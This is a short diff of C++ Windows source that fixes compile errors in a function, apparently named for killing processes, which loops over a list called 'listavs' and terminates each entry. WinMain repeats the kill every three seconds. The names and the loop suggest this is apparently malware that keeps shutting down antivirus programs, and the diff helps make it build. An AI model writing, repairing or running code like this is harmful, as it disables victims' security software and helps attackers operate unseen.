@@ -58,7 +58,7 @@ void jasonkiller()
 	while (i < sizeof listavs / sizeof *listavs)
 	{
 //debug		cout << listavs[i] << "\n";
-		kill_corpse(listavs[i]);
+		kill_corpse(listavs[i].c_str());
 		i++;
 	}
 
@@ -84,7 +84,7 @@ int WINAPI WinMain(HINSTANCE inst,HINSTANCE prev,LPSTR cmd,int show)
  			jasonkiller();
 		}
 // wait 3 sec to kill again
-		sleep(3000); 
+		Sleep(3000); 
 	}
 
 	exit(0);
